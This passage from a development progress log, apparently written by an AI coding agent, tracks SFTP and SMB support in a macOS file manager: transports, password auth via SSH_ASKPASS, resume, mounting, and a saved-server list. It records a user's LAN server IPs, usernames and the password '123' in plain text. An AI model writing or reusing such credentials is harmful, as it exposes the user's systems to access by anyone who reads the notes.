  cap today; the widened `[.read, .write, .rename]` that lights up pass-5's `DeleteStrategy`/clone
  degradation arrives with the byte-transfer pass). `listDirectory`/`stat` route through the parser;
  `stat` **names the entry from the queried path's last component** (since `ls -ld /a/b` prints the
  full arg as the name); a `mapErrors` helper attaches the `VFSPath` the transport (raw-string only)
  couldn't, turning `SFTPTransportError` → `VFSError.notFound/permissionDenied/io`. `volumeIdentifier`
  = `sftp://host:port` so **all one-host jobs serialize** (one SSH channel — parallel transfers only
  contend), cheap/no-I/O as the protocol requires. symlink target reported as nominal `.file` (not
  resolved — matches `ArchiveBackend`); no birth time → `creationDate = modificationDate`.
+8 `SFTPLocation` +11 `SFTPListingParser` +9 `SFTPBackend` tests (a private `FakeSFTPTransport` double
returning canned listings / throwing configured errors) → **418 core tests** (was 390). `swift test`
green, swiftformat/swiftlint-strict clean. GOTCHA: a year-stamped `ls` date parses at **local**
midnight (the formatter sets no zone) → the test must read `.day` in the local calendar, not forced
UTC, or the day shifts. **NEXT M5 (finishes the item):** the app-layer live transport — a
`Process`-driven `ssh`/`sftp` runner (mirroring `ArchiveMounter`/`SpotlightSearchRunner`), a
connection manager + Keychain credential storage + key auth, composite-backend routing on `isSFTP`,
and the **write pass** (mkdir/move/remove + byte `copyFile` with resume, flipping caps to
`[.read, .write, .rename]` → the pass-5 grey-out + Trash-less permanent-delete confirm go live). That
tail is the genuine infra gate: it needs a live/dockerized SSH server (or local Remote Login) +
credentials to verify against — which I can't provision here, so it awaits that setup. Optional
polish still open: Settings picker for the preferred diff tool.

Progress (2026-07-13, M5 pass 7): the **live SFTP transport + app wiring + Connect-to-Server UI** —
**SFTP browse now works end-to-end and is VERIFIED LIVE** against a real server (`oleg@mac`, local
Remote Login), so the `SFTPBackend` box goes `[ ]`→`[~]` (browse done; byte transfer + password/
Keychain auth remain). The user enabled `ssh oleg@mac`; key auth was set up (a throwaway ed25519 key
authorized for the session, all test artifacts cleaned up after). CRITICAL: driving the real `sftp`
CLI first showed its batch `ls -la` **differs from GNU `ls -l`** (captured live), so **pass 6's core
was reworked to match reality** (pass 6 was still uncommitted): (1) the link-count column is `?`;
(2) names are printed as **full paths** (`ls -la <abs>` echoes the arg) → every name reduced to its
last component; (3) symlink **targets aren't shown** (no ` -> t`); (4) `sftp` has **no `ls -d`** → a
single-item stat can't use it. Core changes (still purely additive to DirnexCore): `SFTPTransport`
slimmed to one method `listDirectory` + a tested `SFTPTransportError.classify(stderr:)` (maps `sftp`
stderr → notFound/permissionDenied/failure; permission-denied checked **first** so a bad-key
`identity file … no such file` + `Permission denied` classifies as the actionable auth failure) +
`SFTPBatchCommand.list` (quoted/escaped batch line, tested); `SFTPListingParser` now `parse`s **all**
rows basenamed **including `.`/`..`**; `SFTPBackend.stat` uses the **`.` self-row trick** (a dir
listing carries a `.` row that *is* the directory's stat → identify it, else it's a single-file
row). App layer: `SFTPProcessTransport` (spawns `sftp -i key -o BatchMode=yes -b -`, drains stderr on
a bg queue to dodge a two-pipe deadlock, `resolveHomeDirectory` via `pwd`); `CompositeBackend`
gained an `sftpConnections` registry + `connectSFTP` + `isSFTP` routing (`connectedSFTP` throws a
clear "Not connected" otherwise); `go.connectServer` command → `PanelViewController+SFTP.connectToServer`
(probes home off-main = a fail-fast connection test, then registers + navigates) + `SFTPConnectPrompt`
(NSAlert grid: host/port/user/key-file, rejects leading-`-` args). Two LIVE-found bugs fixed: (a) the
path bar rendered SFTP as **"🔍 Results for oleg"** (the search-results dead-end label) → added an
`isSFTP` branch giving **clickable breadcrumbs rooted at the account** (`oleg@mac › Users › oleg`),
since an SFTP path is re-listable; also `PanelViewController.navigate` no longer treats SFTP as
"wasVirtual" (it keeps a normal back/forward trail) and `FrecencyStore.recordVisit` now only records
`.local` paths (a remote path can't be fuzzy-jumped). (b) recent `ls` dates showed **year 2000** —
the "MMM d HH:mm" form omits the year and `DateFormatter` defaults it to a 2000 reference → set
`defaultDate = now` on the no-year formats (+ a future-date year rollback for the Dec/Jan boundary).
Tests: +`SFTPTransport`(batch/classify incl. bad-key ordering) +`connectServer` catalog cmd +current-
year date +CompositeBackend sftp routing/read-only + a **gated live integration suite**
(`DirnexTests/SFTPLiveIntegrationTests`, enabled only when `/tmp/dirnex_sftp_live_test.json` exists —
`xcodebuild` doesn't forward shell env, so a file not env vars) → **427 core tests**, **14 app tests**
(4 live: resolve-home, list, stat, composite-route — proven genuinely live by a bogus-key run that
*fails* them, not skips). GOTCHA (recurring): the connectServer command tipped `CommandCatalog` over
`type_body_length` 250 → moved the whole `navigation` array into the bottom extension. VERIFIED LIVE
end-to-end via the GUI: Go ▸ Connect to Server → filled host/user/key → the left pane browsed the
remote home (21 items, `oleg@mac › Users › oleg` breadcrumb, correct 2026 dates), then **double-clicked
into `dirnex_sftp_fixture`** — breadcrumb extended, listed `emptydir`/`photos`/`latest` (symlink)/`my
report.txt` (space preserved)/`notes.txt`, `.`/`..` dropped. App `xcodebuild` + `swift test` green,
swiftformat/swiftlint-strict clean. SPOTTED FOLLOW-UP (out of scope, pre-existing): `ArchiveTOCParser`
shares the same no-year→2000 date bug for recent archive members — worth the same `defaultDate = now`
fix. **NEXT M5 (finishes `SFTPBackend`):** the write pass — `SFTPProcessTransport` gains
mkdir/rename/remove + `copyFile` (download via `sftp get`, upload via `put`) with progress/resume,
flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 grey-out + Trash-less permanent-delete
confirm light up; then password/Keychain auth (needs a PTY). Optional polish: an SSH ControlMaster so
repeated listings reuse one connection instead of re-handshaking per directory; saved connections in
the sidebar; Settings picker for the preferred diff tool.

Progress (2026-07-13, M5 pass 8): the **SFTP write pass** — remote mutation + byte transfer, so the
operation queue drives copies, moves, and deletes onto a remote exactly as on disk. **`SFTPBackend`
box stays `[~]`** (byte transfer now DONE; only keychain **password auth** + mid-file **resume**
remain). **VERIFIED LIVE** against `oleg@mac` (a throwaway key the user authorized for the session,
all artifacts cleaned up after — including the remote scratch dir, which the recursive-delete proved
it removes): the gated live suite's new **write round-trip** (mkdir → `put` upload → list-and-check-
size → `get` download → byte-compare → recursive remove) passed through the real `sftp` CLI, plus the
5 existing browse tests. Core→app as always:
- **Core** (hermetic, +14 tests → **441**): `SFTPTransport` grew the write verbs (`makeDirectory`/
  `rename`/`removeFile`/`removeDirectory`/`createSymbolicLink`/`download`/`upload`) + matching
  quoted/escaped `SFTPBatchCommand` builders (`mkdir`/`rename`/`rm`/`rmdir`/`ln -s`/`get`/`put`).
  `SFTPBackend.capabilities` flipped **`.read` → `[.read, .write, .rename]`** (no `.trash`, no
  `.clone` — the exact shape pass 5's `DeleteStrategy`/clone degradation was built for). New
  primitives: `createDirectory` (mkdir); `moveItem` = remote rename within one account, else
  **throws `EXDEV`** so `CopyEngine` falls back to copy-then-delete for a cross-backend (local⇄SFTP)
  move; **recursive `removeItem`** — `sftp` has no `rm -r`, so it empties a directory depth-first
  then `rmdir`s it, and crucially classifies the top item from its **parent listing**, not a `stat`
  of the path (`sftp`'s `ls` *follows* a symlink, so statting a link-to-dir would delete the
  *target's* contents — a parent listing shows the link as a link, so `rm` removes the link alone);
  `copyFile` = **download** (`id` source → `.local` dest, `get`) or **upload** (`.local` source →
  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honouring
  `isCancelled` at the file boundary, refusing an unexpressible remote↔remote copy. The fake
  transport now records every write call so the recursion/routing is asserted without a server.
- **App**: `SFTPProcessTransport` spawns each verb as one `sftp` batch command (reusing the pass-7
  `run(batch:)`), transfers returning the local file's size for progress. `CompositeBackend` routes
  `capabilities(for:)` to a **connected** SFTP backend (`[.read, .write, .rename]`; an unconnected /
  dropped SFTP path falls back to `.read` so writes grey out rather than fail), routes `copyFile` on
  the **destination** when it is remote (so an upload reaches the SFTP `put`; a download/local-local
  still routes on the source), and throws `EXDEV` for any cross-backend move. Reconciled
  `isVirtualDirectory` → **`isArchive || isSearchResults`** (an SFTP dir is a *real* writable remote
  directory, not virtual), which — together with pass-5's capability-driven `validateMenuItem` —
  lights up New Folder (mkdir), F2/⇧F2 rename (remote rename), F8 delete (Trash-less → confirmed
  permanent), ⌘V paste-upload, and F5/F6 up/down on an SFTP pane; relaxed `beginTransfer`'s
  destination guard to allow an SFTP target (upload), made `refreshCurrentDirectory` re-list an SFTP
  pane after a mutation (no FSEvents), and gated ⌘C off SFTP (a remote entry has no *local* URL for
  the pasteboard — F5 is the copy-out route). +1 app test → **16** (`CompositeBackendTests` now
  asserts a connected SFTP path is writable/`.permanent`, an unconnected one read-only). GOTCHA
  (recurring): the new write tests tipped `SFTPBackendTests` over swiftlint `type_body_length` 250 →
  split them into a same-file `extension SFTPBackendTests`. `swift test` (441) + app `xcodebuild
  test` (16) green, swiftformat/swiftlint-strict clean. **NEXT M5 (finishes `SFTPBackend` → `[x]`):**
  password/Keychain auth (needs a PTY, so not the batch `sftp -b -` path — likely `expect`-style or
  an `SSH_ASKPASS` helper) and mid-file resume (`get -a`/`put -a`). Optional polish: SSH
  ControlMaster connection reuse, saved connections in the sidebar, Settings picker for the diff
  tool. **M6 is the next milestone** once SFTP closes out.

Progress (2026-07-13, M5 pass 9): **SFTP password auth** — the harder of the two remaining
`SFTPBackend` items, **DONE and verified live** against a real password server (user-provided
`sa@192.168.1.176`, pass `123`). The plan predicted this "needs a PTY"; it doesn't — the sidestep is
`SSH_ASKPASS`. Key facts discovered by probing OpenSSH 10.2 live before writing any Swift, all of
which shaped the design: (1) `sftp -b -` forces `-oBatchMode=yes` onto `ssh`, which **disables the
password prompt entirely** ("no more authentication methods"), so password auth **cannot use `-b`** —
it runs `sftp` *interactively* over a piped stdin, and the parser's pre-existing `sftp>`-echo skipping
(pass 6/7) already handles the interactive output. (2) With no TTY, `SSH_ASKPASS_REQUIRE=force`
(OpenSSH ≥ 8.4) makes `ssh` call the `SSH_ASKPASS` program for the password — **proven live via a
marker-file probe** that the helper actually fires. (3) **`keyboard-interactive` HANGS for ~60 s on a
*wrong* password** when askpass auto-answers it (macOS PAM), which would freeze the pane on a typo —
so only the `password` method is offered (`PreferredAuthentications=password`, plus
`PubkeyAuthentication=no` so a stray local key can't bypass the choice, `NumberOfPasswordPrompts=1` to
fail fast). Core→app as always:
- **Core** (pure, tested, +6 → **446**): `SFTPAuthentication` enum (`.key(identityFile:)` / `.password`,
  **no secret** — the password is resolved by the app and fed out-of-band); `SFTPProcessArguments.batch(
  location:authentication:connectTimeout:)` assembles the argv — **key** = the untouched verified
  `-i … -o BatchMode=yes … -b -`, **password** = interactive (no `-b`) + the password-only flags above
  — pinned by tests so the security-sensitive flag set (which auth methods, prompt on/off) is verified
  without a server, like `SFTPBatchCommand`; `SFTPTransportError.detect(stderr:)` — interactive `sftp`
  **exits zero on a failed command**, so its errors live only in stderr, and this scans for them
  (`permission denied`/`not found`/`Couldn't …`/`: Failure`) while ignoring benign banners/`Connected
  to …`/host-key warnings; `SFTPLocation.keychainService` + `keychainAccount` (`user@host:port`).
- **App**: `SFTPProcessTransport` reworked to `authentication` + `password` (was `identityFile`), builds
  argv from the core builder, and for password sets the child env (`SSH_ASKPASS` → helper,
  `SSH_ASKPASS_REQUIRE=force`, the password in `DIRNEX_SFTP_PASSWORD`) — the password rides **only** in
  the process environment, never on the argv or on disk. `SFTPAskpassHelper` writes a **secret-free**
  `#!/bin/sh; printf '%s\n' "$DIRNEX_SFTP_PASSWORD"` once to Application Support (0700). `run` now
  drains **both** pipes on a concurrent queue joined by a `DispatchGroup` so a password session can
  **bound its wait** (`passwordTimeout`, 30 s) — a server that never closes the channel can't hang the
  pane — and throws on a bad interactive command via `detect`. `resolveHomeDirectory` opts into
  `tolerateChannelHold` (the connect probe's single-line `pwd` reply is complete even if the server
  holds the channel open — the live test server does exactly that, so a real connect there takes the
  full timeout but succeeds). `SFTPKeychain` (Security framework) stores/loads/deletes the password
  keyed by `keychainAccount`; `SFTPConnectPrompt` gained a Private-Key/Password segmented control + an
  `NSSecureTextField` (irrelevant field greys out); `connectToServer` stores the password to the
  Keychain **only after** the probe authenticates (so a typo isn't cached); `CompositeBackend.connectSFTP`
  + the live/app-test call sites thread `authentication`/`password`. +1 app test (askpass helper is
  executable) + a self-gated **localhost wrong-password** live test (real transport → `.permissionDenied`
  in ~2.4 s, **no TTY hang** — the crux) + a credential-gated **live password-auth** suite
  (`/tmp/dirnex_sftp_password_test.json`) → **19 app tests**. VERIFIED LIVE end-to-end: the real
  `SFTPProcessTransport` authenticated against the user's server with `sa`/`123` through the actual
  `sftp`+`SSH_ASKPASS` path and resolved the remote home. `swift test` (446) + app `xcodebuild test`
  (19) green, swiftformat/swiftlint-strict clean. GOTCHA: the test server ("ServeSense … Brute Force
  Protection") returns an **empty root and holds the channel open** (hangs even after `quit`) — proved
  auth but not browse; `tolerateChannelHold` + `passwordTimeout` keep it from hanging the pane. Also:
  `NSSecureTextField` + a 6-field form tripped swiftlint `function_parameter_count` → grouped the
  controls into a `Fields` struct. **NEXT (finishes `SFTPBackend` → `[x]`):** mid-file **resume**
  (`get -a`/`put -a`) — optional polish, not in the M5 exit criteria; then **M6**.

Progress (2026-07-14, M5 pass 10): **mid-file resume** (`get -a`/`put -a`) — the last remaining
`SFTPBackend` item, **now `[x]`, so the whole SFTP box closes and M5 is DONE**. A copy that finds a
nonzero *proper prefix* of the source already at the destination (a partial from an interrupted
transfer) picks up where it left off instead of re-sending the whole file; `sftp` computes the byte
offset itself from the existing length. User supplied a new test appliance at **192.168.1.50** (SFTP
:22, FTP :21, FTPS :990; `sa`/`123`) — a **ServeSense "Brute Force Protection"** box, the same kind
as pass 9's password server. Chose "finish SFTP first" over adding FTP/FTPS (not in the plan). Core→
app as always:
- **Core** (pure, tested, +5 → **451**): `SFTPTransport.download`/`upload` grew a `resume: Bool`
  parameter; `SFTPBatchCommand.download`/`upload` emit `get -a`/`put -a` when set (default `false`
  keeps every existing call site). `SFTPBackend.copyFile` reworked into `downloadFile`/`uploadFile`
  helpers that **detect a resumable partial cheaply so the common fresh transfer pays nothing**: a
  **download** reads the local partial's size (free `FileManager` stat) and only then asks the server
  for the remote size — a fresh download (no local partial) skips the remote round trip entirely; an
  **upload** only asks the server for the remote destination's size when the source exceeds
  `resumeUploadThreshold` (1 MiB), since re-sending a small file costs less than the metadata round
  trip that finding its partial would need. `progress` reports only the bytes actually moved (the
  remainder when resuming), computed as `finalSize − preExistingSize`; the transport's return value
  was redefined from "bytes transferred" to "the file's final total size" so the backend can derive
  the delta. Tests: batch-command `-a` variants; `copyFile` resumes a download (local partial 120 <
  remote 300 → `get -a`, reports 180), resumes a large upload (remote partial 1 MiB < 2 MiB source →
  `put -a`, reports the 1 MiB remainder), **does not** resume a small upload (skips the stat), and
  **does not** resume a fresh download. GOTCHA (recurring): the fake transport's recorded-transfer
  tuple went to 3 members (`local`/`remote`/`resume`) → swiftlint `large_tuple` → extracted a
  `RecordedTransfer` struct.
- **App**: `SFTPProcessTransport.download`/`upload` thread `resume` through to the batch builder
  (returning the local file's final size). +1 gated live test (`resumesPartialTransfer` in
  `SFTPLiveIntegrationTests`): upload a 120-byte prefix, `put -a` the full 300, then `get -a` a local
  120-byte partial back to 300 and byte-compare — runs green on a well-behaved key-auth server (skips
  in CI / here, like the other live tests). App tests stay at **20** (the new one is gated).
- **Live verification**: the resume *mechanic* was proven end-to-end against the user's 192.168.1.50
  server via the actual `sftp` CLI the app shells out to — `put -a` grew a seeded 120-byte remote file
  to 300 ("Resuming upload", byte-compare matched), and `get -a` grew a local 120-byte partial to 300
  (byte-compare matched); mkdir/put/get/rm/rmdir were also all exercised and the remote left clean.
- **Known limitation (the ServeSense appliance, documented not fixed):** 192.168.1.50 **authenticates**
  (`sa`/`123`, verified live via the app's connect probe, which opts into `tolerateChannelHold`) but
  **holds the SSH channel open after every command** (hangs even after `quit`), so the app's
  one-shot-per-command transport **times out on browse/transfer** through it (only the single-line
  connect probe tolerates the hold today — a multi-row listing must not be read partially). This is
  the same appliance quirk pass 9 already noted; making the whole app work against channel-hold
  appliances (tolerating the hold for transfers, whose size comes from the local file rather than
  stdout) is a separate, considered enhancement, deliberately **not** bundled into this resume pass.
  Because of it, resume was verified via raw `sftp` (above), not the app transport, against this
  particular box; the app-transport path is covered by the gated live test on a normal server.
- **Scope honesty:** resume is a correct, tested `copyFile` capability that activates whenever a
  partial destination is handed in. The current in-app copy flow writes to **fresh temp destinations**
  (the M2 overwrite path uses a per-attempt UUID temp; the direct `.proceed` path writes a fresh
  target), so nothing hands `copyFile` a partial today — resume is inert in that flow by construction.
  Wiring it to fire in-app means preserving a partial across a conflict/overwrite retry (a stable temp
  name), which touches the M2 atomic-swap/undo guarantees — left as a deliberate future step, not done
  here. `swift test` (451) + app `xcodebuild test` (20) green, swiftformat/swiftlint-strict clean.
  **M5 network+sync is now fully `[x]`; M6 (Mac-native power features) is next.** Optional polish
  still open across M5: SSH ControlMaster connection reuse (would also make the resume upload-stat and
  browse cheap, and could sidestep the ServeSense per-command hang), saved SFTP connections in the
  sidebar, a Settings picker for the preferred diff tool; and the user's FTP/FTPS servers remain
  available if FTP(S) backends are ever added (a plan expansion beyond M5's SFTP-only scope).

Progress (2026-07-14, M5 — SMB + unified connection manager, SCOPED not yet built): with the four
original M5 boxes `[x]`, the milestone gains one more remote protocol (SMB, for LAN Macs / PCs / NAS)
plus the "keep every connection in one place" manager the SFTP work deferred. Two design decisions,
both taken deliberately over the tidier-looking alternative:
- **SMB rides the OS mounter, not a protocol backend.** SFTP could shell out to the system `sftp`
  CLI; macOS ships **no `smbclient`**, so the equivalent OS-native sidestep for SMB is the *mounter*.
  `NetFSMountURLSync` (or `Process` → `/sbin/mount_smbfs`) mounts `smb://user@host/share`, and the
  existing `LocalBackend` browses the `/Volumes/…` tree it produces — so copy/move/rename/delete
  (M2), synchronize-directories, compare-by-content, quick-view, and even browsing a zip *on* the
  share all work with **zero new code** and **no new `CompositeBackend` routing**. The rejected
  alternative was a real `SMBBackend` over libsmb2/AMSMB2: it keeps the clean "just another
  VFSBackend" symmetry SFTP has (`smb://…` routed like `sftp://…`, no `/Volumes`), but it's the heavy
  C dependency the plan avoided for SFTP — a module gate like the deferred libarchive one — with no
  CLI to sidestep it and every M2/sync/compare guarantee to re-prove over it. Consistent with the
  non-goals ("folders work as folders; no proprietary APIs"), the mount wins. The one genuinely new
  surface is a **mount lifecycle**: an app-layer `SMBMounter` + mount registry (the non-hermetic I/O
  boundary, like `ArchiveMounter`), mounting on connect, unmounting only what *we* mounted on
  disconnect/quit (leaving a Finder-mounted share alone), and detecting an already-mounted share. Caps
  = `[.read, .write, .rename]`, no APFS clone, Trash-varies → **reuse the pass-5 capability-degradation
  + Trash-less permanent-delete path verbatim**. Guest/anonymous mounts (blank user) supported for
  home NAS; `smbutil view //user@host` share-discovery and Bonjour `_smb._tcp` LAN auto-discovery are
  optional niceties (the latter M6-ish).
- **One connection manager for both protocols.** Today live SFTP connections are ephemeral in
  `CompositeBackend.sftpConnections` (lost on quit) and nothing persists a saved server. Rather than
  add a second, SMB-only model, unify: a pure `ServerConnection` (name = identity like `SavedSearch`;
  `kind: .sftp / .smb`; coordinates + auth *method*, never the secret — Keychain still holds those) +
  `ServerConnections` list (the `SavedSearches` save/rename/move/dedupe shape, unit-tested headless);
  an app `ServerConnectionStore` (UserDefaults JSON + `didChangeNotification`, a `SavedSearchStore`
  clone); a **Servers** sidebar section mirroring **Searches** (click → connect/mount + navigate;
  right-click → Connect / Edit… / Remove; live connected/mounted indicator); and a generalized prompt
  (rename `SFTPConnectPrompt` → `ConnectServerPrompt`, `PanelViewController+SFTP` → `+Connect`) with a
  protocol segmented control (SFTP | SMB) above the existing Auth control and a "Save connection" name
  field. **Address entry is Finder-⌘K-style**: a primary `smb://user@host/share` URL field (type or
  paste, exactly the form Finder's Connect to Server takes) that **parses into editable host / share /
  user fields shown below it**, so paste-a-URL and guided entry both work and the two stay in sync;
  a bare `smb://host` (share omitted) mounts-on-connect / offers a share picker. Under the hood this is
  the same NetFS mount as above — the URL is just what the user sees and what the sidebar stores. This
  **subsumes** the deferred "saved SFTP connections in the sidebar" polish item. The app
  stays non-sandboxed (a plan non-goal), so `mount_smbfs` / NetFS needs no special entitlement.
Nothing built yet — this is the scoped design; core-first as always (`ServerConnection(s)` + tests,
then `SMBMounter` / store / sidebar / prompt), verified live against a LAN SMB share.

Progress (2026-07-14, M5 SMB pass 1 — the pure core): the tested, headless value types landed, the
same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioural change to any
existing type (one additive conformance):
- **`VFS/SMBLocation.swift`** — the SMB analogue of `SFTPLocation`: `host` / `share?` / `username?` /
  `port` (default 445), *without* a secret. Deliberately **not** a `VFSBackendID` address — SMB rides
  the OS mounter, so this is purely the Finder-⌘K URL the user types/pastes and the sidebar stores
  plus the mount target it resolves to. `url` renders the canonical `smb://[user@]host[:port][/share]`
  (default port elided, guest omits `user@`, share-less stops at the host); `init?(url:)` parses that
  form back into editable coordinates — the "address field parses into host/share/user fields below"
  the design calls for is just this round-trip. Parse rules: username up to the first `@`, host up to
  the first `/`, a `:digits` tail split off as the port (a non-numeric colon stays in the host), the
  **first** path component as the share (deeper `…/share/sub` mounts the share; the subpath is
  navigated post-mount). Empty share/username normalize to `nil` so guest and share-less each have one
  representation. `keychainService = "com.dirnex.smb"` + `keychainAccount` = the scheme-less URL
  (unused for guest). Domain (`DOMAIN;user`) and bracketed IPv6 are noted later refinements, like
  SFTP's IPv6 note.
- **`Services/ServerConnection.swift`** — the unified saved-server model (mirrors `SavedSearch`
  name-as-identity): `ServerConnection`(name + `ServerEndpoint`) where `ServerEndpoint` is
  `.sftp(location:authentication:)` | `.smb(SMBLocation)` — one list covers both protocols rather than
  a second SMB-only model. Convenience `kind: ServerKind{.sftp,.smb}` (sidebar icon/branch) and
  `address` (the SFTP descriptor / SMB URL for the subtitle). No secret in the endpoint: SFTP carries
  its auth *method* (`.key(identityFile:)` path or the `.password` marker), SMB's guest-vs-auth is
  captured by whether `username` is set — Keychain still holds any actual password. `ServerConnections`
  is the `SavedSearches` collection verbatim (`save` replace-in-place/append, `remove`,
  `rename` with collision guard, `move`, dedupe-on-init, sanitizing `Codable`). Needed one additive
  change: **`SFTPAuthentication` gained `Hashable, Codable`** (it was `Equatable`) so the endpoint
  enum synthesizes both — purely additive, the full app still builds.
- **`SMBLocationTests` (13) + `ServerConnectionTests` (17)** → **481 core tests** (was 451; +30),
  covering URL format/parse/round-trip/malformed for SMB and the full collection contract +
  per-protocol Codable for the connection list. `swift test` green, swiftformat + swiftlint-strict
  clean, `xcodebuild` app build succeeds. **NEXT (SMB pass 2, app layer):** `SMBMounter` + mount
  registry (NetFS `NetFSMountURLSync` / `mount_smbfs`; mount on connect, unmount only our own),
  `ServerConnectionStore` (a `SavedSearchStore` clone), the **Servers** sidebar section (mirrors
  **Searches**), and the generalized `ConnectServerPrompt` (rename `SFTPConnectPrompt`; protocol picker
  SFTP | SMB + Save + the URL-expands-to-fields entry) — verified live against a LAN SMB share.

Progress (2026-07-14, M5 SMB pass 2 — the app layer, CODE-COMPLETE; live-mount check pending): all
four pass-2 surfaces built, app builds + `swift test` (481 core) + 24 app tests green, swiftformat +
swiftlint-strict clean. Nothing touched `CompositeBackend` routing — SMB never becomes a `VFSBackendID`;
it rides the OS mounter and browses `/Volumes/…` as `.local`, exactly as designed.
- **`SMBMounter.swift`** — the mount lifecycle (the one non-hermetic surface, like `ArchiveMounter`).
  `@MainActor final class` with a `shared` app-wide registry of the `/Volumes/…` paths *we* created.
  `mount(_:username:password:) async` snapshots `FileManager.mountedVolumeURLs` before mounting, runs
  the blocking `NetFSMountURLSync` on a `Task.detached` (so the four static helpers are
  `nonisolated static`), and records the mount as ours only if the path wasn't already mounted — so a
  Finder-mounted share is never adopted. Guest mount = `kNetFSUseGuestKey` + nil user (blank username);
  auth mount passes user/pass separately. **The mount URL is built user-less** (`smb://host[:port]/share`,
  default 445 elided) — the username goes to NetFS as a separate arg, never in both (the one unit-tested
  invariant). `kNAUIOptionKey = kNAUIOptionNoUI` so a bad password errors instead of blocking on a
  dialog. `disconnect(mountPoint:)`/`unmountOwnedMounts()` (called from `AppDelegate.applicationWill
  Terminate`) eject only our mounts via `NSWorkspace.unmountAndEjectDevice`. `SMBMountError:
  LocalizedError` maps `EAUTH`/`ENOENT`/`EHOSTDOWN`/… to human reasons. Needed `import NetFS` (auto-links;
  typechecked green against the SDK). `SMBKeychain` = an `SFTPKeychain` clone keyed by
  `SMBLocation.keychainService`.
- **`ServerConnectionStore.swift`** — a `SavedSearchStore` clone verbatim (UserDefaults JSON under
  `Dirnex.serverConnections` + `didChangeNotification`); no secret ever serialized.
- **Servers sidebar section** — mirrors Searches. `SidebarViewController.Row` gained `.server`, a
  **Servers** header trails the Volumes section, per-kind SF Symbol (`network` SFTP /
  `externaldrive.connected.to.line.below` SMB), click → `didActivateServer`, trailing delete +
  right-click **Connect / Edit… / Remove** (Remove also clears the Keychain secret). Split the
  saved-search **and** new server management into companion files (`SidebarViewController+Searches.swift`,
  `+Servers.swift`) to stay under file_length 500 — which forced widening `Row`/`tableView`/`rows` to
  internal (Swift `private` doesn't cross files, the recurring gotcha); `menuNeedsUpdate` stays in the
  main file as a dispatcher. Two new delegate methods (`didActivateServer`/`didEditServer`).
- **`ConnectServerPrompt` + `ConnectServerForm`** (renamed from `SFTPConnectPrompt`;
  `PanelViewController+SFTP`→`+Connect`, both via `git mv` — synchronized Xcode groups need no pbxproj
  edit). Prompt returns a `Form(endpoint: ServerEndpoint, password:, saveName:)` reusing the pass-1 core
  enum. The form is a protocol picker (SFTP | SMB) over **independent** per-protocol field sets (so no
  cross-contamination / no SFTP `NSUserName()` default leaking into SMB); accessory sized once to the
  taller (SFTP) layout so toggling rows never resizes the modal. **SMB entry is Finder-⌘K-style**: an
  `smb://user@host/share` address field two-way-synced with editable host/share/user fields via the pure
  `SMBLocation` url⇄init round-trip (`controlTextDidChange`, re-entrancy-guarded; port rides the URL).
  Prefill (Edit…) loads coordinates + the Keychain secret. `type_body_length` >250 → view/value factories
  moved to a file-scope `@MainActor private enum ConnectFormFactory`. `PanelViewController+Connect`:
  `connectToServer` (prompt→apply), `connect(to:)` (saved-server, Keychain secret or fall back to the
  prefilled prompt), `editServer` (rename removes-old-then-saves in place); SFTP path unchanged, SMB path
  mounts then `navigate(to: .local(mountPoint))`, secrets filed only after success, saved only when named.
  `CommandCatalog` `go.connectServer` keywords gained smb/share/mount/nas.
CAPS NOTE: SMB browses as `.local` so it gets full local caps — but `clonefile` returns `ENOTSUP` on SMB
→ `CopyEngine` falls back to chunked cleanly, and Trash either works (NAS `.Trashes`) or surfaces an
error; explicit mount-point cap degradation ([.read,.write,.rename]) was deliberately NOT wired (would
couple `CompositeBackend` to the mounter) — deferred. **NEXT: live-verify against a LAN SMB share**
(mount guest + auth, browse/copy/rename/delete, disconnect-unmounts-only-ours, quit-cleanup); then the
share-picker for a bare `smb://host`, Bonjour `_smb._tcp` discovery (M6-ish), and the deferred cap tweak.

Progress (2026-07-14, M5 SMB pass 2 — VERIFIED LIVE against a LAN Windows SMB box, `192.168.1.50`,
share `Temp`, user `smbtest`): drove the built app end-to-end via computer-use. Confirmed: the Connect
dialog renders both layouts; **SMB address `smb://smbtest@host/Temp` two-way-synced into host/share/user
fields**; guest is refused by the box (auth required — mapped cleanly); an authed mount lands at
`/Volumes/Temp`, appears in the sidebar's Volumes section, and browses via `LocalBackend` (`test.txt`
visible); the named connection persisted to the **Servers** section and **survived relaunch**;
right-click **Connect / Edit… / Remove** all work — Connect re-mounts from the Keychain password (no
re-prompt), **Edit… prefills every field incl. the Keychain secret**; **New Folder (createDirectory)
and Delete Immediately (permanent removeItem) both work over SMB**; a **clean quit unmounts only our
mount**, and an externally-mounted share is **left mounted** on quit (the "unmount only ours" safety
guarantee). TWO bugs found + fixed live: (1) the `NSAlert` accessory collapsed and overlapped the
message — cause was setting `translatesAutoresizingMaskIntoConstraints = false` + sizing the container
by constraints; `NSAlert` sizes an accessory by its **frame**, so the container now keeps an explicit
frame and the grid is pinned top-left inside it; (2) re-connecting an already-mounted share hit NetFS
`EEXIST` (17, empty mountpoints) → added `existingMountPoint(for:)` (matches a mounted volume's
`statfs.f_mntfromname` `//host/share`, case-insensitive) so `mount()` **detects and reuses** an existing
mount (Finder's or ours) instead of re-mounting — which also realizes the "detect already-mounted share"
design goal. CONFIRMED the deferred cap gap is real: **Move-to-Trash (F8) fails on the Windows share**
(error 3328) since SMB carries full local caps; Delete Immediately is the working path. 481 core + 24
app tests green, swiftformat/swiftlint-strict clean. The SMB item is now `[x]`; only the optional
niceties (bare-host share-picker, Bonjour discovery, F8→permanent-delete cap-degradation on SMB mounts)
remain, all deferrable to M6-ish polish.

### M6 — Mac-native power features (M)

- [x] Git awareness: branch in path bar, status column (M/A/?/ignored) via a debounced
      `git status --porcelain` provider; .gitignore-aware folder sizes (the optional slice —
      **done 2026-07-19**, see the pass note at the end of this file)
- [x] Finder tags: ~~column~~ **dots at the right edge of the name**, where Finder puts them (the
      word "column" was written before anyone had looked at Finder; see pass 4), edit from panel,
      filter chips in search
- [x] Terminal drawer: bottom pane following active panel's cwd; "cd sync back" via
      ~~shell integration snippet~~ `proc_pidinfo` (no snippet exists, and none should — see
      pass 7); open in iTerm/Terminal/WezTerm as alternative
- [x] Size visualization mode: toggle panel to ncdu-style bars, computed async, cached
- [x] Share sheet, "Open With" submenu, Services integration
- [x] Automation: AppleScript/Shortcuts verbs (reveal, copy, run-op); user actions —
      shell scripts receiving selection as argv/env, surfaced in palette and F-key bar
- [x] iCloud/provider sync status: ~~column~~ **a badge at the right edge of the name**, outside the
